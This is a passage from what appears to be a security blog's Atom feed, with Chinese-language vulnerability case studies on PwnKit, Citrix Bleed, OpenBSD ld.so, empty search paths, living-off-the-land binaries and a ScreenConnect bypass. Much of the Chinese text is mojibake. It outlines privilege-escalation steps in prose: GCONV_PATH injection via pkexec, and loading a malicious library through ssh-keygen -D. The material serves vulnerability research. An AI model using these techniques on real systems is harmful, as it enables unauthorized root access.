rel="noopener">https://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html</a></li><li><a href="https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html" target="_blank" rel="noopener">https://codebrowser.dev/glibc/glibc/elf/dl-support.c.html</a></li><li><a href="https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html" target="_blank" rel="noopener">https://codebrowser.dev/glibc/glibc/sysdeps/generic/unsecvars.h.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2019-19726 OpenBSD dynamic loader Local Privilege Escalation Vulnerability&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="LPE" scheme="https://programlife.net/tags/LPE/"/>
    
      <category term="Pwnie Awards" scheme="https://programlife.net/tags/Pwnie-Awards/"/>
    
      <category term="LD_LIBRARY_PATH" scheme="https://programlife.net/tags/LD-LIBRARY-PATH/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-4034 PwnKit PolKit pkexec æœ¬åœ°ææƒæ¼æ´</title>
    <link href="https://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/"/>
    <id>https://programlife.net/2024/03/17/cve-2021-4034-pwnkit-polkit-pkexec-lpe/</id>
    <published>2024-03-17T13:33:37.000Z</published>
    <updated>2024-03-17T08:05:59.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability</p></blockquote><a id="more"></a><p>CVE-2021-4034 æ˜¯ Qualys Research Team å‘ç°çš„ä½äº PolKit pkexec ä¸­çš„æœ¬åœ°ææƒæ¼æ´ï¼Œæ¼æ´å–å PwnKitï¼ŒåŸå§‹æŠ¥å‘Šå¯ä»¥å‚è€ƒ <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">pwnkit: Local Privilege Escalation in polkitâ€™s pkexec (CVE-2021-4034)</a> / <a href="https://web.archive.org/web/20240211132200/https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">Wayback Machine</a>ã€‚</p><p>è¯¥æ¼æ´è·å¾—äº† <a href="https://pwnies.com/category/nominations/?y=2022" target="_blank" rel="noopener">Pwnie Awards / Epic Achievement</a> æåï¼š</p><blockquote><ul><li>THAT VIASAT THINGIE</li><li>Yuki Chenâ€™s Windows Server-Side RCE Bugs</li><li>pwnkit: Local Privilege Escalation in polkitâ€™s pkexec (CVE-2021-4034)</li></ul></blockquote><p>è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨éå¸¸å·§å¦™ï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹ä¸‹ <a href="https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº - CVE-2021-4034 æ·±å…¥åˆ†æåŠæ¼æ´å¤ç°</a> / <a href="https://web.archive.org/web/20240317025711/https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3DeY0KKqRDcQBxYwD" target="_blank" rel="noopener">Wayback Machine</a>ï¼Œè¿™ç¯‡æ–‡ç« ä»‹ç»çš„æ¯”è¾ƒå…¨é¢ï¼ˆåŒ…æ‹¬æ¼æ´åŸç†ã€<code>ld.so</code> å¤„ç† SUID-root ç¨‹åºçš„å±é™©ç¯å¢ƒå˜é‡ã€Exploit å®ç°ç»†èŠ‚ä¸Šéœ€è¦æ³¨æ„çš„é—®é¢˜ç­‰ï¼‰ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨æµç¨‹</strong>ï¼š</p><ol><li><code>execve</code> æ‰§è¡Œ PolKit pkexec æ—¶ï¼Œè®© <code>argv</code> ä¸ºç©ºæ•°ç»„ï¼ˆé•¿åº¦ä¸º <code>0</code>ï¼‰</li><li>PolKit pkexec <code>argv[1]</code> è¶Šç•Œè®¿é—®ï¼ˆOut-of-Bounds Read åˆ° <code>envp[0]</code>ï¼‰</li><li>ç›¸å¯¹è·¯å¾„æ‰©å±•ï¼ˆé€šè¿‡ <code>execve</code> æ§åˆ¶ <code>PATH</code> ç¯å¢ƒå˜é‡ï¼Œå¯¹ <code>envp[0]</code> å®æ–½è·¯å¾„æ‰©å±•ï¼‰</li><li><code>argv[1]</code> è¶Šç•Œå†™å…¥ï¼ˆOut-of-Bounds Writeï¼‰ï¼Œå®ç°æ”¹å†™ <code>envp[0]</code>ï¼Œè¾¾åˆ°æ³¨å…¥ä»»æ„ç¯å¢ƒå˜é‡çš„ç›®çš„</li><li>åˆ©ç”¨ä¸Šä¸€æ­¥æ³¨å…¥ <code>GCONV_PATH</code> ç¯å¢ƒå˜é‡ï¼Œé…åˆ glib çš„ <code>g_printerr</code>ï¼Œåœ¨è¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶å®ç°åŠ è½½è‡ªå®šä¹‰ so åŠ¨æ€åº“</li><li>å®Œæˆææƒæ“ä½œ</li></ol><p><strong>æ¼æ´åˆ©ç”¨æ³¨æ„äº‹é¡¹</strong>ï¼š<code>setenv</code> <strong>å¯èƒ½</strong>ä¼šå¯¼è‡´ç¯å¢ƒå˜é‡æ•°ç»„ <code>envp</code> å‘ç”Ÿä½ç½®è¿ç§»</p><p><strong>æ¼æ´ä¿®å¤</strong>ï¼šé™¤äº†å¯¹ pkexec æœ¬èº«è¿›è¡Œä¿®å¤å¤–ï¼Œæ“ä½œç³»ç»Ÿå±‚é¢å¯èƒ½ä¸å†æ”¯æŒ <code>execve(path, {NULL}, envp)</code> è¿™ç§æ“ä½œï¼Œæˆ–è€…è¯´ï¼Œè‡³å°‘ä¼šå¯¹è¿™ç§ç‰¹æ®Šçš„ <code>argv</code> è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚è½¬æ¢æˆ <code>{&quot;&quot;, NULL}</code>ï¼ˆ<code>argc</code> ä»ç„¶ä¸º <code>0</code>ï¼‰ï¼Œè¿™æ ·å³ä½¿å­˜åœ¨ç±»ä¼¼ pkexec è¿™æ ·çš„æ¼æ´ï¼Œä¹Ÿæ— æ³•è¿›è¡Œåˆ©ç”¨äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;CVE-2021-4034 PwnKit PolKit pkexec Local Privilege Escalation Vulnerability&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="PolKit" scheme="https://programlife.net/tags/PolKit/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="GCONV_PATH" scheme="https://programlife.net/tags/GCONV-PATH/"/>
    
      <category term="LPE" scheme="https://programlife.net/tags/LPE/"/>
    
      <category term="Pwnie Awards" scheme="https://programlife.net/tags/Pwnie-Awards/"/>
    
  </entry>
  
  <entry>
    <title>Linux Empty Search Path Vulnerability</title>
    <link href="https://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/"/>
    <id>https://programlife.net/2024/03/16/linux-empty-search-path-vulnerability/</id>
    <published>2024-03-16T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.</p></blockquote><a id="more"></a><p><strong>CWE-427: Uncontrolled Search Path Element</strong></p><ul><li><p><a href="https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">CWE - CWE-427: Uncontrolled Search Path Element (4.14)</a> / <a href="https://web.archive.org/web/20240316031216/https://cwe.mitre.org/data/definitions/427.html" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>In some Unix-based systems, a <strong>PATH</strong> might be created that contains an empty element, e.g. by splicing an empty variable into the <strong>PATH</strong>. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.</p></blockquote></li></ul><p><strong>Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</strong></p><ul><li><p><a href="https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Empty Entry in LD_LIBRARY_PATH May Lead to Security Issues</a> / <a href="https://web.archive.org/web/20240316031202/https://jdhao.github.io/2021/07/03/ld_library_path_empty_item/" target="_blank" rel="noopener">Wayback Machine</a></p></li><li><blockquote><p>An empty item is interpreted by <code>ld</code> as the current working directory. As a result, <code>ld</code> may load library from the current working directory, causing unintended effects, or even security vulnerability if an attacker puts some harmful library in the current directory.</p></blockquote></li></ul><p><strong>CVE-2010-4450</strong></p><ul><li><blockquote><p>Oracle has not commented on claims from a downstream vendor that this issue is an untrusted search path vulnerability involving an empty <strong>LD_LIBRARY_PATH</strong> environment variable.</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Empty Search Path (PATH or LD_LIBRARY_PATH) could lead to security vulnerabilities.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="ld.so" scheme="https://programlife.net/tags/ld-so/"/>
    
      <category term="LD_LIBRARY_PATH" scheme="https://programlife.net/tags/LD-LIBRARY-PATH/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æ¡ˆä¾‹ç ”ç©¶ CVE-2023-4966 Citrix Bleed ä¿¡æ¯æ³„éœ²æ¼æ´</title>
    <link href="https://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/"/>
    <id>https://programlife.net/2024/03/11/cve-2023-4966-citrix-bleed/</id>
    <published>2024-03-11T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Citrix Bleed æ¼æ´ï¼ˆCVE-2023-4966ï¼‰ç›¸å…³çš„å‡ ç¯‡å‚è€ƒæ–‡æ¡£</p></blockquote><a id="more"></a><p>Citrix Bleed æ¼æ´ï¼Œå³ CVE-2023-4966ï¼Œç®—æ˜¯ 2023 å¹´æ¯”è¾ƒçŸ¥åçš„æ¼æ´äº†ï¼Œè¢« DARKNAVY è¯„ä¸º <a href="https://mp.weixin.qq.com/s/YO55cT4jjqFukCdAWxkNiQ?forceh5=1" target="_blank" rel="noopener">2023 å¹´åº¦æœ€è´¹é’±çš„æ¼æ´</a>ä¹‹ä¸€ï¼ˆå¦ä¸€ä¸ªæ¼æ´æ˜¯ CVE-2023-34362ï¼‰ï¼Œå¦‚æœä½ æ²¡æœ‰å¬è¯´è¿‡è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥äº†è§£ä¸‹ç›¸å…³çš„èƒŒæ™¯ä¿¡æ¯ã€‚</p><p><strong>æ¼æ´çš„åŸç†éå¸¸ç®€å•</strong>ï¼šè¯¯ç”¨ <code>snprintf</code> å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è¿œç¨‹è§¦å‘æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ¥æ”¶åˆ°é€šè¿‡ OOB Read æ³„éœ²çš„è¿›ç¨‹å†…å­˜å†…å®¹ï¼Œæ¨¡å¼ä¸Šç±»ä¼¼ Heart Bleed æ¼æ´ã€‚</p><p>å¯¹äºæ¼æ´ç»†èŠ‚ï¼Œè¿™é‡Œä¸åšèµ˜è¿°ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥é˜…è¯»ä¸‹é¢å‡ ç¯‡æ–‡ç« ï¼ˆå› ä¸ºäº’è”ç½‘ä¸Šçš„é“¾æ¥æ€»ä¼šå› ä¸ºå„ç§åŸå› è€Œä¸å†æœ‰æ•ˆï¼Œæ‰€ä»¥æˆ‘ç»™ä»–ä»¬åšäº†ä¸€ä¸ªå¤‡ä»½ï¼‰ï¼š</p><ol><li><a href="https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">Librelp buffer overflow fix (cve-2018-1000140) - a collaboration between Adiscon and Semmle</a> / <a href="https://web.archive.org/web/20240311130505/https://securitylab.github.com/research/librelp-buffer-overflow-cve-2018-1000140/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">CVE-2018-18820: Snprintf Vulnerability in Icecast</a> / <a href="https://web.archive.org/web/20240311130514/https://securitylab.github.com/research/cve-2018-18820-snprintf-vulnerability-icecast/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">Citrix Bleed: Leaking Session Tokens with CVE-2023-4966</a> / <a href="https://web.archive.org/web/20240311130513/https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://paper.seebug.org/269/" target="_blank" rel="noopener">å®æˆ˜æ ˆæº¢å‡ºï¼šä¸‰ä¸ªæ¼æ´æå®šä¸€å°è·¯ç”±å™¨</a> / <a href="https://web.archive.org/web/20170610035343/http://paper.seebug.org/269/" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li><li><a href="https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">CVE-2023-4966 citrix å†…å­˜æ³„æ¼</a> / <a href="https://web.archive.org/web/20240311132549/https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">å¤‡ä»½å­˜æ¡£</a></li></ol><p>è§£é‡Šä¸€ä¸‹å¼•ç”¨ä¸Šé¢å‡ ç¯‡æ–‡ç« çš„åŸå› ï¼š</p><ol><li>GitHub Security Lab çš„æ–‡ç« ï¼Œå¾ˆå¥½çš„è§£é‡Šäº†ä¸ <code>snprintf</code> æœ‰å…³çš„ <code>2</code> ä¸ªæ³¨æ„äº‹é¡¹</li><li>GitHub Security Lab çš„æ–‡ç« ï¼Œå’Œå‰ä¸€ç¯‡å·®ä¸å¤š</li><li>Assetnote çš„æ–‡ç« ï¼Œå¯èƒ½æ˜¯æœ€æ—©å…¬å¼€ Citrix Bleed ç»†èŠ‚çš„æ–‡ç« ï¼ˆ<strong>æœªè€ƒè¯</strong>ï¼‰</li><li>é•¿äº­ç§‘æŠ€çš„ä¸€ç¯‡è€æ–‡ç« ï¼Œä¸ä»…è¯´æ˜äº†å†å²åœ¨ä¸æ–­é‡å¤ï¼Œä¹Ÿè¯´æ˜äº†å†å²æƒŠäººçš„ç›¸ä¼¼æ€§</li><li>é•¿äº­ç§‘æŠ€ä¸€åå‘˜å·¥çš„åšå®¢ï¼Œå¼•ç”¨è¿™ç¯‡æ–‡ç« å•çº¯æ˜¯å› ä¸ºä»–ä¹Ÿæåˆ°é•¿äº­çš„å‰ä¸€ç¯‡æ–‡ç« </li></ol><p><strong>å¦‚æœä½ æƒ³å¤ç°è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯ç”±äºå®¢è§‚åŸå› æ— æ³•é¡ºåˆ©æ­å»ºå¤ç°ç¯å¢ƒï¼Œå¯ä»¥è”ç³»æˆ‘å…è´¹è·å– Tipsï¼ŒèŠ‚çº¦æ—¶é—´å’Œé‡‘é’± :P</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Citrix Bleed æ¼æ´ï¼ˆCVE-2023-4966ï¼‰ç›¸å…³çš„å‡ ç¯‡å‚è€ƒæ–‡æ¡£&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="æ¼æ´æ¡ˆä¾‹ç ”ç©¶" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Citrix" scheme="https://programlife.net/tags/Citrix/"/>
    
      <category term="snprintf" scheme="https://programlife.net/tags/snprintf/"/>
    
  </entry>
  
  <entry>
    <title>Living Off the Land Techniques</title>
    <link href="https://programlife.net/2024/03/03/living-off-the-land-techniques/"/>
    <id>https://programlife.net/2024/03/03/living-off-the-land-techniques/</id>
    <published>2024-03-03T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Living off the Land</strong> (<strong>LOTL</strong>) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as <strong>LOLBins</strong>, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.</p></blockquote><a id="more"></a><h2 id="0x01-Living-off-the-Land"><a href="#0x01-Living-off-the-Land" class="headerlink" title="0x01. Living off the Land"></a>0x01. Living off the Land</h2><p>Living off the Landï¼ŒæŒ‰ç…§ä¿¡è¾¾é›…çš„ç¿»è¯‘å¯ä»¥ç†è§£ä¸ºâ€œ<strong>é å±±åƒå±±ï¼Œé æ°´åƒæ°´</strong>â€ :P</p><p>å‡ ä¸ªæ”¶é›†æ­¤ç±»ä¿¡æ¯çš„ç½‘ç«™å¦‚ä¸‹ï¼š</p><ol><li>Unix - <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li><li>Windows - <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a></li><li>macOS - <a href="https://www.loobins.io/" target="_blank" rel="noopener">https://www.loobins.io/</a></li><li>Windows Drivers - <a href="https://www.loldrivers.io/" target="_blank" rel="noopener">https://www.loldrivers.io/</a></li></ol><p>æœ€åä¸€ä¸ªï¼ˆWindows é©±åŠ¨ï¼‰å’Œ BYOVD æ˜¯ä¸€ä¸ªæ„æ€ï¼Œå³ <strong>Bring Your Own Vulnerable Driver</strong>ï¼Œç›®å‰æ¶æ„è½¯ä»¶å¸¸ç”¨çš„ææƒæ–¹å¼ä¹‹ä¸€ã€‚DefCon 27 ä¸Šæœ‰ä¸ªä¸“é—¨è®²æ€ä¹ˆæŒ–æ˜å’Œåˆ©ç”¨ç¬¬ä¸‰æ–¹é©±åŠ¨ç¨‹åºæ¼æ´çš„è®®é¢˜ã€Š<a href="https://media.defcon.org/DEF CON 27/DEF CON 27 presentations/DEFCON-27-Jesse-Michael-Get-off-the-kernel-if-you-cant-drive.pdf" target="_blank" rel="noopener">Defcon 27: Get off the Kernel if you canâ€™t Drive</a>ã€‹ã€‚</p><p><img src="/uploads/202403/Get-Off-The-Kernel-If-You-Cannot-Drive.webp" alt="Defcon 27: Get off the Kernel if you can&#39;t Drive"></p><p>CISA (<em>Cybersecurity and Infrastructure Security Agency</em>) é˜²å¾¡æŒ‡å¼•ï¼š</p><ol><li><a href="https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques</a></li><li><a href="https://www.cisa.gov/sites/default/files/2024-02/Joint-Guidance-Identifying-and-Mitigating-LOTL_V3508c.pdf" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques - PDF</a></li></ol><h2 id="0x02-ssh-keygen-ææƒæ¡ˆä¾‹"><a href="#0x02-ssh-keygen-ææƒæ¡ˆä¾‹" class="headerlink" title="0x02. ssh-keygen ææƒæ¡ˆä¾‹"></a>0x02. ssh-keygen ææƒæ¡ˆä¾‹</h2><p>å‚è€ƒï¼š<a href="https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html" target="_blank" rel="noopener">Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)</a></p><p>å¹¶ä¸æ˜¯è¯´ <code>ssh-keygen</code> æœ¬èº«å­˜åœ¨ææƒé—®é¢˜ï¼Œè€Œæ˜¯è¯´åœ¨å¯ä»¥ä»¥ <code>root</code> æƒé™è¿è¡Œè¯¥ç¨‹åºçš„åœºæ™¯ä¸‹ï¼ˆæ¯”å¦‚ <code>sudoers</code> é…ç½®ã€SUID è®¾ç½®ç­‰ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨è¯¥ç¨‹åºæ¥åŠ è½½æŒ‡å®šçš„åŠ¨æ€åº“ï¼ˆ<code>-D</code> é€‰é¡¹ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ man ssh-keygen</span><br><span class="line">SSH-KEYGEN(1)             BSD General Commands Manual               SSH-KEYGEN(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">     ssh-keygen â€” OpenSSH authentication key utility</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">[...]</span><br><span class="line">     ssh-keygen -D pkcs11</span><br><span class="line">[...]</span><br><span class="line">     -D pkcs11</span><br><span class="line">             Download the public keys provided by the PKCS#11 shared library pkcs11.</span><br><span class="line">             When used in combination with -s, this option indicates that a CA key</span><br><span class="line">             resides in a PKCS#11 token (see the CERTIFICATES section for details).</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>åŸæ–‡æåˆ°äº†ä¸¤ç§æ€è·¯ï¼š</p><ol><li>åœ¨ç›®æ ‡æœºå™¨ä¸Šæœç´¢ä¸€ä¸ªå¯ä»¥ <code>exec /bin/sh</code> çš„å€™é€‰åŠ¨æ€åº“ï¼Œç„¶åé€šè¿‡åå…­è¿›åˆ¶ç¼–è¾‘å™¨ã€åæ±‡ç¼–å™¨ï¼ˆGhidra æˆ– IDAï¼‰ã€patchelf ç­‰ï¼Œå¯¹å…¶è¿›è¡Œ Patch æ“ä½œ</li><li>è‡ªå·±å†™ä¸€ä¸ªï¼ˆåªéœ€è¦å†™ä¸€ä¸ª <code>constructor</code> å‡½æ•°å³å¯ï¼‰ï¼Œæœ¬åœ°äº¤å‰ç¼–è¯‘åä¸Šä¼ </li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Living off the Land&lt;/strong&gt; (&lt;strong&gt;LOTL&lt;/strong&gt;) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as &lt;strong&gt;LOLBins&lt;/strong&gt;, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Red Teaming" scheme="https://programlife.net/categories/Red-Teaming/"/>
    
    
      <category term="LOTL" scheme="https://programlife.net/tags/LOTL/"/>
    
      <category term="LOLBins" scheme="https://programlife.net/tags/LOLBins/"/>
    
      <category term="BYOVD" scheme="https://programlife.net/tags/BYOVD/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´æ¡ˆä¾‹ç ”ç©¶ ConnectWise ScreenConnect Authentication Bypass</title>
    <link href="https://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/"/>
    <id>https://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/</id>
    <published>2024-02-25T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ ConnectWise ScreenConnect çˆ†äº† 2 ä¸ªæ¼æ´ï¼ˆCVE-2024-1709 å’Œ CVE-2024-1708ï¼‰ï¼Œå…¶ä¸­ <strong>CVE-2024-1709</strong> æ˜¯ä¸€ä¸ª Authentication Bypass æ¼æ´ï¼ŒCVSS è¯„åˆ† 10 åˆ†ã€‚Sophos å®‰å…¨å›¢é˜Ÿè¡¨ç¤ºï¼Œå‹¤åŠ³çš„æ”»å‡»è€…å·²ç»åœ¨ç¬¬ä¸€æ—¶é—´åˆ©ç”¨è¿™äº›æ¼æ´æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ã€‚æœ¬æ–‡ç®€å•æ•´ç†ç›¸å…³ä¿¡æ¯ï¼Œä½œä¸ºæ¼æ´æ¡ˆä¾‹ç ”ç©¶ç³»åˆ—çš„ç¬¬ä¸€ç¯‡æ–‡ç« ã€‚</p><a id="more"></a><h2 id="0x01-ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« "><a href="#0x01-ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« " class="headerlink" title="0x01. ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« "></a>0x01. ä¸ºä»€ä¹ˆåœ¨è¿™æ°´æ–‡ç« </h2><p>ç¬”è€…æœ€è¿‘çš„å·¥ä½œæ–¹å‘å¼€å§‹è½¬å‘äº§å“å®‰å…¨è“å†›ï¼Œå½“å‰ä¸»è¦å·¥ä½œåŒ…æ‹¬ï¼šä»£ç å®¡è®¡ã€å®‰å…¨æ”»é˜²ã€å‚ç±»æ¶æ„è½¯ä»¶æ£€æµ‹ã€‚</p><p>ä¸€æ–¹é¢ï¼Œä»£ç å®¡è®¡å’Œä¹‹å‰åšäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜åœ¨æ€è·¯ä¸Šæ¯”è¾ƒç±»ä¼¼ï¼Œæœ€é‡è¦çš„ç†ŸçŸ¥å„ç§<strong>æ¼æ´æ¨¡å¼</strong>ï¼ˆæˆ–è€…è¯´æ”»å‡»é¢ï¼‰ã€‚å°±å¥½æ¯” Integer Overflowï¼ŒæŒ–æ˜æ€è·¯å°±æ˜¯æ‰¾åˆ°å„ä¸ªå†…å­˜åˆ†é…ç‚¹ï¼Œç„¶åçœ‹å‚æ•°æ˜¯å¦æ˜¯ç»è¿‡æŸäº›ç®—æœ¯è¿ç®—è€Œæ¥ï¼Œæœ€åæ˜¯è¿™äº›å‚æ•°æ˜¯å¦æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ±¡ç‚¹åˆ†æçš„æ€è·¯ã€‚ä¹Ÿä¸éš¾ç†è§£<strong>æ¼æ´æ¨¡å¼</strong>å…¶å®ç±»ä¼¼<strong>è®¾è®¡æ¨¡å¼</strong>ï¼Œæ˜¯ä¸€å¥—æ€»ç»“å‡ºæ¥çš„æ–¹æ³•è®ºã€‚</p><p>å¦ä¸€æ–¹é¢ï¼ŒçœŸæ­£çš„ RCE æ¼æ´å¾€å¾€æ˜¯æ”»å‡»è€…æœ€å–œæ¬¢çš„æ¼æ´ï¼Œæ¯”å¦‚æœ¬æ–‡æåˆ°çš„ ConnectWise ScreenConnect Authentication Bypass æ¼æ´ CVE-2024-1709ï¼Œä»¥åŠå»å¹´è¿˜ç®—æ¯”è¾ƒç«çš„ Citrix Bleed æ¼æ´ CVE-2023-4966ï¼Œéƒ½è¢«æ”»å‡»è€…ç”¨æ¥æŠ•é€’å‹’ç´¢è½¯ä»¶ï¼Œåœ¨ ATT&amp;CK æ¡†æ¶ä¸­è¢«å½’ç±»ä¸º <strong>Initial Access</strong>ã€‚è€Œåœ¨é»‘å¸‚ä¸Šï¼Œå°±æœ‰ä¸“é—¨ä»äº‹è¿™ç±»æ“ä½œçš„ç»„ç»‡ï¼Œè¢«ç§°ä¹‹ä¸º <strong>Initial Access Broker</strong>ï¼ˆIABï¼‰ï¼Œä»–ä»¬åˆ©ç”¨æ¼æ´æˆ–è€…é’“é±¼ç­‰æ‰‹æ®µæ¥è·å–å„ç§ç³»ç»Ÿçš„æƒé™ï¼Œç„¶åå°†æƒé™å€’å–ç»™å…¶ä»–ç»„ç»‡ï¼ˆæ¯”å¦‚å‹’ç´¢è½¯ä»¶å›¢ä¼™ï¼‰ã€‚</p><p>é‰´äºæ­¤ï¼Œç¬”è€…å†³å®šå¯¹è¿™ç±»æ¼æ´è¿›è¡Œç®€å•çš„åˆ†æã€æ•´ç†å’Œå½’ç±»ï¼Œä»¥ä¾¿æ—¥ååœ¨å·¥ä½œä¸­ä½œä¸ºå‚è€ƒã€‚</p><h2 id="0x02-CVE-2024-1709"><a href="#0x02-CVE-2024-1709" class="headerlink" title="0x02. CVE-2024-1709"></a>0x02. CVE-2024-1709</h2><p>åœ¨æ¼æ´æ¨¡å¼ä¸Šï¼Œæš‚ä¸”å°†è¿™ä¸ªæ¼æ´å½’ç±»ä¸º Setup Wizard ç±»å‹ã€‚</p><h3 id="2-1-æ¼æ´åŸç†"><a href="#2-1-æ¼æ´åŸç†" class="headerlink" title="2.1 æ¼æ´åŸç†"></a>2.1 æ¼æ´åŸç†</h3><p>Huntress 